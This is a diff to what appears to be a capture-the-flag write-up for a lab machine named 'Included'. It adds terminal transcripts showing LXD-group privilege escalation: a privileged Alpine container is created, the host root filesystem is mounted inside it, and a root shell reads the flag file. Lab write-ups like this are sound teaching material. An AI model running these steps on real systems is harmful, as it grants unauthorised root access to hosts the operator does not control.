@@ -67,6 +67,55 @@ total 4444
 
 ```
 
+
+# TODO: Fix output :)
+```
+mike@included:/tmp/ignore$ lxc image import ./al.tar.gz --alias alpine
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b                                                         
+mike@included:/tmp/ignore$ lxc init alpine r00t -c security.privileged=true  
+Creating r00t                                                                
+mike@included:/tmp/ignore$ export PS1='\$'
+$lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+Device mydev added to r00t
+$lxc start r00t
+$lxc exec r00t /bin/sh
+~ # whoami
+root
+~ # id
+uid=0(root) gid=0(root)
+~ # df -h
+Filesystem                Size      Used Available Use% Mounted on
+/dev/sda2                 8.7G      2.2G      6.4G  25% /
+none                    492.0K         0    492.0K   0% /dev
+udev                    964.6M         0    964.6M   0% /dev/fuse
+udev                    964.6M         0    964.6M   0% /dev/net/tun
+tmpfs                   100.0K         0    100.0K   0% /dev/lxd
+/dev/sda2                 8.7G      2.2G      6.4G  25% /mnt/root
+udev                    964.6M         0    964.6M   0% /mnt/root/dev
+tmpfs                   996.7M         0    996.7M   0% /mnt/root/dev/shm
+tmpfs                   199.3M      1.0M    198.3M   1% /mnt/root/run
+tmpfs                     5.0M         0      5.0M   0% /mnt/root/run/lock
+tmpfs                   199.3M         0    199.3M   0% /mnt/root/run/user/1000
+tmpfs                   996.7M         0    996.7M   0% /mnt/root/sys/fs/cgroup
+/dev/loop0               99.4M     99.4M         0 100% /mnt/root/snap/core/11316
+/dev/loop1               99.4M     99.4M         0 100% /mnt/root/snap/core/11743
+tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/shmounts
+tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/devlxd
+tmpfs                   100.0K         0    100.0K   0% /dev/.lxd-mounts
+tmpfs                   199.3M     40.0K    199.3M   0% /run
+~ # ls -l /mnt/root/
+bin/            initrd.img      mnt/            snap/           vmlinuz
+boot/           initrd.img.old  opt/            srv/            vmlinuz.old
+cdrom/          lib/            proc/           sys/
+dev/            lib64/          root/           tmp/
+etc/            lost+found/     run/            usr/
+home/           media/          sbin/           var/
+~ # ls -l /mnt/root/root/root.txt 
+-r--------    1 root     root            33 Mar  9  2020 /mnt/root/root/root.txt
+~ # md5sum /mnt/root/root/root.txt 
+7ef07ff4703c59f103bdb88833f50666  /mnt/root/root/root.txt
+
+```
 ## Import the alpine image
 ```
 mike@included:/tmp/ignore$ lxc image import ./alpine-v3.13-x86_64-20210218_01tar.gz --alias alpine
@@ -108,4 +157,10 @@ find: /sys/kernel/debug: Permission denied
 
 # TODO: Fix line wrappings!
 The comman for lxd is so long that the line wraps in the terminal and doesn't execute correctly!
+
+```
+mike@included:/var/lib/tftpboot$ stty cols 120
+mike@included:/tmp/ignore$ export PS1='\$'
+$
+```
 
